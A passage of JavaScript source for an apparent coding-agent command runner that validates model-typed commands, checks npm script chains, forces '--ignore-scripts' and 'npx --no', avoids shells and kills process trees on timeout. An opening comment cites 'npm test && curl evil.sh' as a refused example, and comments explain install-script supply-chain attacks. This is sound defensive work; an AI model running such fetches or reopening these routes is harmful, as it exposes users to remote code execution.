 * tokenizer, which is where it should die. A lone `&` backgrounds a process and
 * is not this feature. `npm test && curl evil.sh` still refuses, on `curl`.
 *
 * ⚠️ AN EMPTY SEGMENT IS A REFUSAL, NOT A SKIP. `node a.js &&` is malformed, and
 * a validator that treats "nothing to check" as "fine" has approved a string it
 * never inspected.
 *
 * ⚠️ THIS DOES NOT TOUCH THE MODEL-WRITTEN COMMAND PATH. A command the model
 * types still goes through `validateCommand` whole, where `&` is refused. The
 * difference is authorship: a package.json script was written by a human and is
 * reviewable in the repo; a model-authored string is neither.
 */
function validateScriptBody(body) {
  const segments = String(body).split('&&');
  if (segments.length === 1) return validateCommand(body, { script: true });

  for (const segment of segments) {
    const trimmed = segment.trim();
    if (!trimmed) {
      return { ok: false, error: `"${body}" has an empty step around "&&" — that is a typo, not a command chain` };
    }
    const verdict = validateCommand(trimmed, { script: true });
    if (!verdict.ok) {
      return { ok: false, error: `the step ${JSON.stringify(trimmed)} is not allowed: ${verdict.error}` };
    }
  }
  return { ok: true };
}

export function validateNpmScriptChain(scriptName, packageJsonText) {
  let pkg;
  try {
    pkg = JSON.parse(packageJsonText);
  } catch (err) {
    return { ok: false, error: `package.json is not valid JSON: ${err instanceof Error ? err.message : String(err)}` };
  }
  const scripts = pkg && typeof pkg === 'object' ? pkg.scripts : null;
  if (!scripts || typeof scripts !== 'object') {
    return { ok: false, error: 'package.json has no "scripts" section, so there is nothing to run' };
  }
  if (typeof scripts[scriptName] !== 'string') {
    const available = Object.keys(scripts).slice(0, 12);
    return {
      ok: false,
      error: `package.json has no "${scriptName}" script${available.length ? ` (it has: ${available.join(', ')})` : ''}`,
    };
  }
  const chain = [`pre${scriptName}`, scriptName, `post${scriptName}`]
    .filter((name) => typeof scripts[name] === 'string')
    .map((name) => ({ name, body: scripts[name] }));

  for (const link of chain) {
    const verdict = validateScriptBody(link.body);
    if (!verdict.ok) {
      return {
        ok: false,
        error: `the "${link.name}" script is ${JSON.stringify(link.body)}, which is not allowed: ${verdict.error}`,
      };
    }
  }
  return { ok: true, chain };
}

/**
 * ⚠️ WHY THIS RESOLVES `npm` TO A `.js` FILE INSTEAD OF SPAWNING `npm`.
 *
 * On Windows `npm` is `npm.cmd`, and since the BatBadBut fix (CVE-2024-27980)
 * Node REFUSES to spawn a `.cmd` without `shell: true`. The obvious workaround
 * is therefore to turn the shell back on — which would hand a shell the string
 * this entire file exists to keep away from one, and would do it on the single
 * platform where the developer is working today.
 *
 * So: spawn the real `node` binary we are already running (`process.execPath`)
 * with npm's own JavaScript entry point. No shim, no shell, same behaviour on
 * every platform, and one fewer thing that resolves through `PATH`.
 */
function findNpmEntry(fileName, execPath = process.execPath) {
  const dir = dirname(execPath);
  const candidates = [
    join(dir, 'node_modules', 'npm', 'bin', fileName),        // Windows, nvm
    join(dir, '..', 'lib', 'node_modules', 'npm', 'bin', fileName), // POSIX prefix layout
    join(dir, '..', 'node_modules', 'npm', 'bin', fileName),
  ];
  return candidates.find((c) => existsSync(c)) ?? null;
}

/**
 * Turn a validated command into an exact `spawn(file, args)` with no shell and
 * no PATH lookup of anything but node itself.
 */
export function buildInvocation(valid, root, { execPath = process.execPath } = {}) {
  const rest = valid.tokens.slice(1);
  if (valid.binary === 'node') {
    return { ok: true, file: execPath, args: rest };
  }
  if (valid.binary === 'npm') {
    const entry = findNpmEntry('npm-cli.js', execPath);
    if (!entry) return { ok: false, error: 'npm could not be located next to this Node install, so it cannot be run without a shell' };
    /**
     * ── ⚠️⚠️⭐ `--ignore-scripts` IS FORCED HERE, AT THE SPAWN, ON PURPOSE ──
     *
     * THE DECISION, AND ITS COST, BOTH WRITTEN DOWN: an npm install runs
     * `preinstall`/`install`/`postinstall` for the requested package AND FOR
     * EVERY TRANSITIVE DEPENDENCY, as the invoking user, before anyone has read
     * a line of what arrived. That is the mechanism essentially every npm
     * supply-chain worm has used, Shai-Hulud included. It is strictly more
     * dangerous than anything else this package permits, and it is not needed
     * for the thing the agent actually wants, which is `import { z } from 'zod'`
     * to resolve.
     *
     * ⚠️ WHAT IT BREAKS, HONESTLY: packages that compile a native addon or
     * download a prebuilt binary at install time — `esbuild`, `sharp`,
     * `better-sqlite3`, `bcrypt`, `puppeteer`, `cypress`. They will land on disk
     * and then fail at require time. That is a MINORITY of the registry and it
     * is the correct minority to lose: those are exactly the installs a human
     * should be running, because they are the ones that execute something.
     * `formatRunForModel` prints this so the agent can say it rather than
     * flailing at a mystery failure.
     *
     * ⭐ AND WHY *HERE* RATHER THAN IN THE VALIDATOR: this is derived from the
     * ARGV ABOUT TO BE SPAWNED, not from a flag a caller remembered to set. A
     * second caller (`spawn-argv.mjs`) builds npm install argvs too; deriving it
     * from the noun means that caller cannot forget, and a future third caller
     * cannot either. A guard that depends on being told is a guard that gets
     * satisfied by coincidence.
     *
     * ⚠️ A COMMAND-LINE FLAG BEATS `.npmrc` IN NPM'S CONFIG PRECEDENCE (cli >
     * env > project .npmrc > user .npmrc), so a workspace `.npmrc` cannot undo
     * this. `executeRunCommand` refuses on such an `.npmrc` anyway — belt and
     * braces, because the precedence is npm's promise and not ours.
     */
    const args = [entry, ...rest];
    if (NPM_INSTALL_SUBCOMMANDS.has(rest[0])) args.splice(2, 0, '--ignore-scripts');
    return { ok: true, file: execPath, args };
  }
  if (valid.binary === 'npx') {
    const entry = findNpmEntry('npx-cli.js', execPath);
    if (!entry) return { ok: false, error: 'npx could not be located next to this Node install, so it cannot be run without a shell' };
    /**
     * ⚠️ `--no` IS THE WHOLE REASON npx IS ALLOWED AT ALL. Without it, npx
     * DOWNLOADS a missing package and runs it — remote code execution with a
     * friendly name. With it, npx will only run a binary already installed in
     * this workspace, and says so plainly when it is not.
     */
    return { ok: true, file: execPath, args: [entry, '--no', ...rest] };
  }
  if (valid.binary === 'tsc') {
    // tsc: the workspace's own compiler, never a global one.
    const local = join(root, 'node_modules', 'typescript', 'bin', 'tsc');
    if (!existsSync(local)) {
      return { ok: false, error: 'tsc is not installed in this workspace (node_modules/typescript is missing)' };
    }
    return { ok: true, file: execPath, args: [local, ...rest] };
  }

  const spec = valid.spec;
  /* c8 ignore next */
  if (!spec) return { ok: false, error: `${valid.binary} has no invocation rule — this is a bug in acuvo-code` };

  /**
   * ⭐ THE `node-bin` PRESET RESOLVES TO A FILE, NOT TO A NAME — the same trick
   * `tsc` already uses, and it is the reason this preset is the safest of them:
   * nothing goes through `PATH`, and our own `process.execPath` runs it.
   *
   * ⚠️ It also sidesteps the Windows trap the npm comment above describes. The
   * `node_modules/.bin/eslint` shim is `eslint.cmd` on Windows, and since
   * CVE-2024-27980 Node refuses to spawn a `.cmd` without `shell: true` — which
   * is the one thing this file will never turn on. Naming the package's own
   * `.js` entry point avoids the shim entirely.
   */
  if (spec.resolve === 'node-module') {
    for (const candidate of spec.nodeModule ?? []) {
      const abs = join(root, ...candidate.split('/'));
      if (existsSync(abs)) return { ok: true, file: execPath, args: [abs, ...rest] };
    }
    return {
      ok: false,
      error: `${valid.binary} is not installed in this workspace (looked for ${(spec.nodeModule ?? []).join(', ')}). It is run from node_modules on purpose — a global one would be a program nobody in this repository agreed to.`,
    };
  }

  /**
   * ⚠️ A PRESET BINARY IS FOUND ON `PATH`, AND THAT IS THE HONEST WEAKENING.
   * `node`, `npm`, `npx` and `tsc` resolve to files we can name; `python` and
   * `make` cannot. Whoever enabled the preset chose that, which is exactly why
   * presets are off by default and why the workspace layer can only pick from a
   * vetted menu. Still `shell: false`, still no metacharacters, still every
   * operand contained in the workspace.
   */
  return { ok: true, file: valid.binary, args: rest };
}

/**
 * Keep the head AND the tail of a stream.
 *
 * ⚠️ NOT `slice(0, n)`, AND THE REASON IS THE WHOLE POINT OF THE LOOP. A test
 * runner prints the first failure near the top and the summary at the very
 * bottom; keeping only the head throws away "3 failed", and keeping only the
 * tail throws away the stack trace that says why. Both ends, gap declared.
 *
 * Pure.
 */
export function clampOutput(text, maxChars = MAX_CAPTURED_CHARS) {
  if (typeof text !== 'string') return { text: '', truncated: false, omitted: 0 };
  if (text.length <= maxChars) return { text, truncated: false, omitted: 0 };
  const head = Math.floor(maxChars * 0.35);
  const tail = maxChars - head;
  const omitted = text.length - maxChars;
  return {
    text: `${text.slice(0, head)}\n\n… ${omitted} characters omitted …\n\n${text.slice(-tail)}`,
    truncated: true,
    omitted,
  };
}

/**
 * ⚠️⭐ KILL THE TREE, NOT THE PROCESS — AND THE ORPHANS THAT PROVED IT.
 *
 * `child.kill('SIGKILL')` reaches exactly one pid. On Windows that is a
 * `TerminateProcess` against the direct child; on POSIX a single-pid signal.
 * Neither touches what the command STARTED — and what a coding agent runs is
 * precisely the kind of thing that starts something: a dev server, a watcher, a
 * worker pool, or npm, which on Windows runs the script through an intermediate
 * `cmd.exe` that then runs node.
 *
 * Measured, not reasoned about: `npm test` against a script that spawns a child
 * and never exits left pid 13128 running with its ParentProcessId 19836 already
 * gone — a true orphan, running until reboot, on the owner's personal laptop.
 *
 * So: on Windows, `taskkill /T` walks the child list the OS keeps and kills the
 * whole tree. On POSIX the child is spawned `detached`, which makes it a PROCESS
 * GROUP LEADER, and a negative pid signals the entire group.
 *
 * ⚠️ A FAILURE TO KILL MUST NEVER THROW. By the time we get here the process is
 * usually already dead, and "the thing I was going to kill is gone" is the
 * success case, not an error. Every path is swallowed.
 */
/**
 * ⚠️ EXPORTED FOR `background.mjs` AND FOR NO OTHER REASON. A second
 * implementation of this is how the orphan above comes back: the Windows
 * `taskkill /T` branch and the POSIX negative-pid branch are both non-obvious,
 * and a background process is the exact shape (a dev server, a watcher) that
 * proved they were needed.
 */
export function killProcessTree(child) {
  const pid = child?.pid;
  if (typeof pid !== 'number' || pid <= 0) {
    // A stubbed child in a test, or a spawn that never got a pid. Best effort.
    try { child?.kill?.('SIGKILL'); } catch { /* already gone */ }
    return;
  }
  if (process.platform === 'win32') {
    try {
      // ⚠️ The REAL `spawn`, never `spawnImpl` — `spawnImpl` is the injection
      // point for the command under test, and a test that stubs it is not
      // asking to stub the reaper.
      const reaper = spawn('taskkill', ['/T', '/F', '/PID', String(pid)], {
        windowsHide: true,
        stdio: 'ignore',
        shell: false,
      });
      // It must not keep the event loop alive, and its own failure is not ours.
      reaper.on('error', () => { /* taskkill missing or the pid already went */ });
      if (typeof reaper.unref === 'function') reaper.unref();
    } catch { /* already gone */ }
    return;
  }
  try {
    process.kill(-pid, 'SIGKILL');
  } catch {
    // Not a group leader (detached was refused, or the platform did something
    // else) — fall back to the one pid we can definitely name.
    try { child.kill('SIGKILL'); } catch { /* already gone */ }
  }
}

/**
 * Spawn it. Never throws — a failure to start is data, like every other tool
 * result in this package.
 *
 * ── ⚠️⭐ WHY THIS SETTLES ON MORE THAN `close`, AND WHAT IT COST TO LEARN ─────
 *
 * `close` is the RIGHT event to settle on, and it stays the normal path: it
 * fires only once the process has exited AND the captured stdout/stderr pipes
 * have reached EOF, which is the only moment we can promise the output is
 * complete. That second condition is also the trap.
 *
 * EOF arrives when the LAST holder of the pipe's write end lets go — and a
 * descendant that inherited those handles is a holder. So when the timeout
 * killed npm's node, npm's script descendant kept the write handles open, EOF
 * never came, `close` never fired, and the promise never resolved. Not "resolved
 * late" — never. Measured four times: `executeRunCommand({command:'npm test',
 * timeoutMs:4000})` returned nothing after 20,019ms of waiting, and end to end
 * the real binary printed `── round 1/2 ──` and sat there for 120s+ despite
 * `--command-timeout 5`. There is no session-level deadline anywhere in this
 * package, so that is an unbounded hang with no outer bound to catch it: the
 * documented flag simply did nothing.
 *
 * ⚠️ THE ISOLATION CONTROL IS WHY `close` SURVIVED THE FIX: the identical
 * hanging script run as a DIRECT child, with no descendants, settled correctly
 * at 4,154ms with signal SIGKILL. The event was never wrong. It was
 * insufficient — a promise with no path to rejection.
 *
 * ⭐ So there are now two more ways out, and both defer to `close` if it comes:
 *   · `exit` — the process is gone, only the pipes are outstanding. Give them a
 *     grace window, then return what we captured with the REAL exit code. This
 *     also bounds the case nobody had noticed: a command that exits 0 while
 *     leaving a daemon behind, which used to burn the entire timeout and then
 *     be reported as a timeout, which was a lie.
 *   · the timeout itself — because if the kill fails, `exit` never comes either.
 *
 * `settled` already made `finish` idempotent, so all three racing is safe.
 */
export function spawnBounded({ file, args, cwd, timeoutMs, spawnImpl = spawn, env }) {
  return new Promise((done) => {
    const started = Date.now();
    let child;
    try {
      child = spawnImpl(file, args, {
        cwd,
        /**
         * ⚠️ `childEnvironment` RATHER THAN `scrubEnvironment`, and it is given
         * the argv so it can tell an npm run from everything else — see the
         * paragraph on that function. A caller that passes its own `env` is
         * responsible for the same thing; the two that do are named there.
         */
        env: env ?? childEnvironment({ file, args }, process.env),
        // ⚠️ NEVER `true`. Everything above assumes no shell parses this.
        shell: false,
        windowsHide: true,
        stdio: ['ignore', 'pipe', 'pipe'],
        /**
         * ⚠️ POSIX ONLY, AND IT IS NOT COSMETIC: `detached` makes the child a
         * process group leader, which is the ONLY thing that makes
         * `process.kill(-pid)` able to reach what the command spawned. On
         * Windows it would ask for a new console instead, which is the opposite
         * of `windowsHide`, so there `taskkill /T` does the same job.
         *
         * The cost, stated: the child no longer shares our process group, so a
         * Ctrl-C in the terminal no longer reaches it directly. The timeout and
         * the tree kill are what stop it now, and those are the mechanisms this
         * tool is supposed to rely on anyway.
         */
        ...(process.platform === 'win32' ? {} : { detached: true }),
      });
    } catch (err) {
      return done({ ok: false, error: `could not start the command: ${err instanceof Error ? err.message : String(err)}` });
    }

    let timedOut = false;
    let exitCode = null;
    let exitSignal = null;

    /**
     * ── ⚠️⚠️ KEEP BOTH ENDS. THE OLD CAP KEPT THE WRONG ONE ─────────────────
     *
     * The cap is applied WHILE READING and must stay that way — a build loop
     * printing a gigabyte cannot be held in memory to be trimmed afterwards.
     * But it used to be `if (stdout.length < cap) stdout += d`, which keeps the
     * FIRST 32KB and discards everything after.
     *
     * ⭐ EVERY TEST RUNNER PRINTS ITS VERDICT LAST. "5 failed, 212 passed", the
     * stack traces, the summary. So on any suite louder than 32KB the model was
     * handed the opening banner, `clampOutput` then took a "tail" of that
     * already-truncated buffer — the MIDDLE of the real output — and the loop
     * fixed whatever it could see while never learning the run had failed.
     * The exit code stayed honest, so it read as "it tried" rather than "it was
     * shown the wrong evidence", which is why it survived this long.
     *
     * ⭐ A HEAD BUFFER AND A TAIL RING, both bounded, so memory is still capped
     * at roughly what it was — and `produced` counts what the process actually
     * emitted, because reporting "24,000 characters omitted" for a 5MB run is a
     * confident falsehood and this package treats silent truncation as the worst
     * class of bug it can ship.
     */
    const cap = MAX_CAPTURED_CHARS * 4;
    const HALF = Math.floor(cap / 2);
    const streams = {
      stdout: { head: '', tail: '', produced: 0 },
      stderr: { head: '', tail: '', produced: 0 },
    };
    const absorb = (s, chunk) => {
      s.produced += chunk.length;
      if (s.head.length < HALF) s.head += chunk.slice(0, HALF - s.head.length);
      // ⚠️ Slice AFTER concatenating, so a chunk larger than HALF still leaves
      // its own tail behind rather than being dropped whole.
      s.tail = (s.tail + chunk).slice(-HALF);
    };
    /** Head + a truthful marker + the real tail. */
    const assemble = (s) => {
      if (s.produced <= s.head.length) return { text: s.head, omitted: 0 };
      if (s.produced <= cap) {
        // Everything fits: head and tail together are the whole stream, and the
        // tail ring already holds the part the head did not.
        return { text: s.head + s.tail.slice(-(s.produced - s.head.length)), omitted: 0 };
      }
      const omitted = s.produced - s.head.length - s.tail.length;
      return {
        text: `${s.head}\n\n… ${omitted} characters omitted …\n\n${s.tail}`,
        omitted,
      };
    };

    child.stdout?.setEncoding('utf8');
    child.stderr?.setEncoding('utf8');
    child.stdout?.on('data', (d) => absorb(streams.stdout, d));
    child.stderr?.on('data', (d) => absorb(streams.stderr, d));

    let settled = false;
    let graceTimer = null;
    let timer = null;

    const finish = (payload) => {
      if (settled) return;
      settled = true;
      if (timer) clearTimeout(timer);
      if (graceTimer) clearTimeout(graceTimer);
      done(payload);
    };

    /** Return what we actually have. Used by every settle path. */
    const finishWithCaptured = () => {
      /**
       * ⚠️ `assemble` ALREADY BOUNDED THIS, and its marker already states the
       * true loss. `clampOutput` runs second and trims further for the model's
       * context — but its own `omitted` is computed against the string it was
       * handed, so it can only ever describe ITS cut, never the stream's. The
       * honest total is carried separately in `stdoutOmitted`/`stderrOmitted`.
       */
      const outRaw = assemble(streams.stdout);
      const errRaw = assemble(streams.stderr);
      const out = clampOutput(outRaw.text);
      const errText = clampOutput(errRaw.text);
      finish({
        ok: true,
        exitCode,
        signal: exitSignal,
        timedOut,
        durationMs: Date.now() - started,
        stdout: out.text,
        stderr: errText.text,
        truncated: out.truncated || errText.truncated || outRaw.omitted > 0 || errRaw.omitted > 0,
        /** What the PROCESS produced but nobody will ever see. Additive fields. */
        stdoutOmitted: outRaw.omitted + out.omitted,
        stderrOmitted: errRaw.omitted + errText.omitted,
        stdoutProduced: streams.stdout.produced,
        stderrProduced: streams.stderr.produced,
      });
    };

    /**
     * Give `close` its grace window, then stop waiting for it.
     *
     * ⚠️ AND LET GO OF THE PIPES ON THE WAY OUT. If a descendant really did
     * survive the tree kill, those read streams stay ACTIVE HANDLES — the tool
     * call would return while the CLI process itself could no longer exit,
     * turning a hung tool call into a hung program. Abandoning a stream we have
     * already decided to stop reading costs nothing.
     */
    const armGrace = () => {
      if (settled || graceTimer) return;
      graceTimer = setTimeout(() => {
        try { child.stdout?.destroy(); } catch { /* already closed */ }
        try { child.stderr?.destroy(); } catch { /* already closed */ }
        try { child.unref?.(); } catch { /* not a real child */ }
        finishWithCaptured();
      }, TIMEOUT_SETTLE_GRACE_MS);
      if (typeof graceTimer.unref === 'function') graceTimer.unref();
    };

    timer = setTimeout(() => {
      timedOut = true;
      // SIGKILL rather than SIGTERM: the thing being killed is a process that
      // already ignored its chance to exit, and on Windows SIGTERM is advisory.
      if (exitSignal === null) exitSignal = 'SIGKILL';
      killProcessTree(child);
      // ⚠️ Armed HERE as well as on `exit`, because a kill that does not land
      // produces no `exit` either — and that combination is exactly the hang.
      armGrace();
    }, timeoutMs);
    if (typeof timer.unref === 'function') timer.unref();

    child.on('error', (err) => {
      finish({ ok: false, error: `the command could not run: ${err instanceof Error ? err.message : String(err)}` });
    });
    child.on('exit', (code, signal) => {
      if (typeof code === 'number') exitCode = code;
      if (signal) exitSignal = signal;
      // The process is gone; only the pipes are outstanding. `close` normally
      // wins this race by microseconds and clears the timer.
      armGrace();
    });
    child.on('close', (code, signal) => {
      if (typeof code === 'number') exitCode = code;
      if (signal) exitSignal = signal;
      finishWithCaptured();
    });
  });
}

/**
 * The tool entry point: a model-supplied string in, a result the model can act
 * on out. Every refusal path returns before anything is spawned.
 *
 * @param {{ command: unknown, executor: any, timeoutMs?: number, spawnImpl?: Function }} args
 */
export async function executeRunCommand({ command, executor, timeoutMs = DEFAULT_COMMAND_TIMEOUT_MS, spawnImpl = spawn, shell = false }) {
  /**
   * ⚠️ A DRY RUN THAT RUNS THE TEST SUITE IS NOT A DRY RUN. `--dry-run` promises
   * the disk is untouched; a command is free to touch it, so the promise can
   * only be kept by refusing here.
   */
  if (executor.dryRun) {
    return { ok: false, error: 'this is a --dry-run, so no command is executed (a command could write to disk, which a dry run promises not to do)' };
  }

  /**
   * ⭐ THE ALLOWLIST IS RESOLVED PER CALL, FROM THE WORKSPACE AND THE
   * ENVIRONMENT — read through the EXECUTOR, so `.acuvo/commands.json` gets the
   * same path rules, the same size cap and the same refusals as every other
   * file this agent touches. No second reader, no second set of rules.
   *
   * ⚠️ ABSENT IS NOT MALFORMED, and the two must not be conflated: no file at
   * all is the overwhelmingly common case and means "the default four". A file
   * that exists and cannot be parsed is a broken control, and it stops the
   * command rather than quietly reverting to the default — which is `policy.mjs`
   * fail-closed reasoning, applied to the other half of the same `.acuvo/`
   * directory.
   */
  /**
   * ── ⚠️ THE SHELL BRANCH — EVERYTHING BELOW IT IS THE ALLOWLIST ────────────
   *
   * It returns early ON PURPOSE, rather than threading `shell` through
   * `validateCommand`. A validator that sometimes validates is the shape that
   * produces a "safe" mode which quietly is not: one wrong branch and a caller
   * who never asked for the shell gets it. Two paths that share nothing cannot
   * leak into each other, and the ONE place that chooses between them is a
   * single boolean the operator typed.
   */
  if (shell) {
    const invocation = buildShellInvocation(command);
    if (!invocation.ok) return { ok: false, error: invocation.error };
    const bounded = Math.min(Math.max(1_000, timeoutMs), MAX_COMMAND_TIMEOUT_MS);
    const run = await spawnBounded({
      file: invocation.file,
      args: invocation.args,
      cwd: executor.root,
      timeoutMs: bounded,
      spawnImpl,
    });
    if (!run.ok) return run;
    return {
      ok: true,
      command: String(command).trim(),
      argv: [invocation.file, ...invocation.args],
      scriptChain: null,
      // ⭐ Flagged on the RESULT, so the audit log and the report can say a
      // shell ran this without having to re-derive it from the argv.
      viaShell: true,
      exitCode: run.exitCode,
      signal: run.signal,
      timedOut: run.timedOut,
      durationMs: run.durationMs,
      stdout: run.stdout,
      stderr: run.stderr,
      truncated: run.truncated,
      passed: run.exitCode === 0 && !run.timedOut,
    };
  }

  const configRead = executor.readFile(COMMANDS_CONFIG_FILE);
  let configText = null;
  if (configRead.ok) {
    configText = configRead.content;
  } else if (!/^no such file/i.test(String(configRead.error ?? ''))) {
    return { ok: false, error: `${COMMANDS_CONFIG_FILE} exists but could not be read: ${configRead.error}` };
  }
  const resolved = resolveCommandAllowlist({ configText, envValue: process.env[ALLOW_COMMANDS_ENV] });
  if (!resolved.ok) return { ok: false, error: `the command allowlist could not be loaded: ${resolved.error}` };

  /**
   * ⚠️ THE ENVIRONMENT IS READ EXACTLY ONCE, HERE, AND NOWHERE DEEPER.
   * `validateCommand` stays pure; the only code that can turn `npm install` on
   * is the code that already reads `process.env` for the allowlist. Same door,
   * same audit story.
   */
  const allowInstall = installEnabled(process.env);
  const valid = validateCommand(command, { allowlist: resolved.allowlist, allowInstall });
  if (!valid.ok) return valid;

  // The npm script body gate — read through the EXECUTOR so the same path
  // rules apply, and so a workspace with no package.json says so clearly.
  let scriptChain = null;
  if (valid.binary === 'npm' && valid.npmScript) {
    const pkgRead = executor.readFile('package.json');
    if (!pkgRead.ok) return { ok: false, error: `cannot run npm here: ${pkgRead.error}` };
    const chain = validateNpmScriptChain(valid.npmScript, pkgRead.content);
    if (!chain.ok) return { ok: false, error: chain.error };
    scriptChain = chain.chain;
  }

  /**
   * ── ⚠️ THE INSTALL PRE-FLIGHT: TWO FILES INSIDE THE WORKSPACE ─────────────
   *
   * Both are files THIS AGENT CAN WRITE, which is the only reason they are
   * checked at all.
   *
   *   · `package.json` must already exist. Without it npm invents a nameless
   *     project and installs into it, so the dependency the human is supposed to
   *     review lands somewhere nobody is looking.
   *   · `.npmrc` must not redirect the registry or re-enable install scripts.
   *     See `inspectNpmrcForInstall` — this is the `package.json` scripts
   *     bypass arriving through a different file.
   */
  if (valid.binary === 'npm' && valid.npmInstall) {
    const pkgRead = executor.readFile('package.json');
    if (!pkgRead.ok) {
      return { ok: false, error: `cannot run npm ${valid.npmInstall.sub} here: ${pkgRead.error}. Write a package.json first — an install into a directory with no manifest records the dependency nowhere.` };
    }
    try {
      JSON.parse(pkgRead.content);
    } catch (err) {
      return { ok: false, error: `package.json is not valid JSON, so npm would rewrite it from nothing: ${err instanceof Error ? err.message : String(err)}` };
    }
    /**
     * ⚠️ THE MANIFEST NAMES PACKAGES NO OPERAND EVER MENTIONED. A bare
     * `npm install` has an empty package list, so every operand check above
     * passed on a command with nothing to check while npm read this file.
     */
    const manifest = inspectManifestForInstall(pkgRead.content);
    if (!manifest.ok) return { ok: false, error: manifest.error };
    const lockRead = executor.readFile('package-lock.json');
    if (lockRead.ok) {
      const lock = inspectLockfileForInstall(lockRead.content);
      if (!lock.ok) return { ok: false, error: lock.error };
    } else if (!/^no such file/i.test(String(lockRead.error ?? ''))) {
      return { ok: false, error: `package-lock.json exists but could not be read, so this install cannot be checked: ${lockRead.error}` };
    }
    const rcRead = executor.readFile('.npmrc');
    if (rcRead.ok) {
      const rc = inspectNpmrcForInstall(rcRead.content);
      if (!rc.ok) return { ok: false, error: rc.error };
    } else if (!/^no such file/i.test(String(rcRead.error ?? ''))) {
      return { ok: false, error: `.npmrc exists but could not be read, so this install cannot be checked: ${rcRead.error}` };
    }
  }

  const invocation = buildInvocation(valid, executor.root);
  if (!invocation.ok) return { ok: false, error: invocation.error };

  // ⚠️ An install gets a FLOOR, not the caller's number — see INSTALL_MIN_TIMEOUT_MS.
  const floor = valid.npmInstall ? INSTALL_MIN_TIMEOUT_MS : 1_000;
  const bounded = Math.min(Math.max(floor, timeoutMs), MAX_COMMAND_TIMEOUT_MS);
  const run = await spawnBounded({
    file: invocation.file,
    args: invocation.args,
    cwd: executor.root,
    timeoutMs: bounded,
    spawnImpl,
  });
  if (!run.ok) return run;

  /**
   * ── ⭐ THE RECEIPT: WHAT LANDED IN `package.json`, RE-READ FROM DISK ───────
   *
   * "The lockfile and package.json get modified under the user" is the honest
   * complaint about `npm install`, and the answer is not to suppress the
   * modification (`--no-save` is refused above — an unrecorded install is worse)
   * but to STATE it. So after the run, package.json is read again and the exact
   * range npm wrote for each requested name is reported.
   *
   * ⚠️ IT IS READ AFTER, NOT PREDICTED BEFORE. `npm install zod` writes
   * `^4.1.12` or whatever the registry served today; a receipt that repeated
   * what was ASKED FOR would be a receipt for a fact nobody checked. `git_diff`
   * shows the lockfile churn, which is the other half and already has a tool.
   */
  let installed = null;
  if (valid.npmInstall && run.exitCode === 0 && !run.timedOut) {
    installed = readInstalledRanges(executor, valid.npmInstall.packages);
  }

  return {
    ok: true,
    command: valid.command,
    argv: [invocation.file, ...invocation.args],
    scriptChain,
    installed,
    exitCode: run.exitCode,
    signal: run.signal,
    timedOut: run.timedOut,
    durationMs: run.durationMs,
    stdout: run.stdout,
    stderr: run.stderr,
    truncated: run.truncated,
    // ⚠️ `ok: true` MEANS THE COMMAND RAN, NOT THAT IT PASSED. Those are
    // different facts and conflating them is exactly how a loop ends up
    // reporting success on a failing test. `passed` is the second fact.
    passed: run.exitCode === 0 && !run.timedOut,
  };
}

/**
 * Read back the range npm actually wrote for each requested package.
 *
 * ⚠️ A package that was requested and is NOT in package.json afterwards is
 * reported as `null` rather than omitted. npm exits 0 on plenty of partial
 * outcomes, and a receipt that silently drops the line it could not confirm is
 * the "green run, nothing happened" failure this package keeps finding.
 */
function readInstalledRanges(executor, packages) {
  if (!packages.length) return [];
  const read = executor.readFile('package.json');
  if (!read.ok) return packages.map((p) => ({ name: p.name, range: null, section: null }));
  let pkg;
  try {
    pkg = JSON.parse(read.content);
  } catch {
    return packages.map((p) => ({ name: p.name, range: null, section: null }));
  }
  const sections = ['dependencies', 'devDependencies', 'optionalDependencies', 'peerDependencies'];
  return packages.map((p) => {
    for (const section of sections) {
      const block = pkg?.[section];
      if (block && typeof block === 'object' && typeof block[p.name] === 'string') {
        return { name: p.name, range: block[p.name], section };
      }
    }
    return { name: p.name, range: null, section: null };
  });
}

/**
 * Render a finished run for the MODEL. Compact, unambiguous, and leading with
 * the exit code — the one number the next round has to react to.
 *
 * Pure.
 */
export function formatRunForModel(result) {
  if (!result.ok) return `command refused: ${result.error}`;
  const lines = [`$ ${result.command}`];
  if (Array.isArray(result.installed)) {
    /**
     * ⭐ THE MODEL IS TOLD `--ignore-scripts` WAS FORCED, EVERY TIME. Without
     * this line, a package whose postinstall downloads its binary (`esbuild`,
     * `sharp`, `puppeteer`) installs "successfully" and then fails at require
     * time with an error that looks like a bug in the agent's own code. Naming
     * the cause up front turns a confusing loop into one sentence the agent can
     * pass to the human.
     */
    for (const item of result.installed) {
      lines.push(item.range
        ? `  recorded in package.json: "${item.name}": "${item.range}" (${item.section})`
        : `  ⚠️ "${item.name}" is NOT in package.json after this install — nothing was recorded`);
    }
    lines.push('  (installed with --ignore-scripts forced: no lifecycle script from any package ran. A package that builds a native addon or downloads a binary at install time will need a human to install it.)');
  }
  if (result.timedOut) {
    lines.push(`TIMED OUT after ${Math.round(result.durationMs / 1000)}s and was killed. It produced no exit code.`);
  } else {
    lines.push(`exit code: ${result.exitCode} (${(result.durationMs / 1000).toFixed(1)}s)${result.passed ? ' — PASSED' : ' — FAILED'}`);
  }
  if (result.stdout.trim()) lines.push('--- stdout ---', result.stdout.trimEnd());
  if (result.stderr.trim()) lines.push('--- stderr ---', result.stderr.trimEnd());
  if (!result.stdout.trim() && !result.stderr.trim()) lines.push('(no output)');
  return lines.join('\n');
}
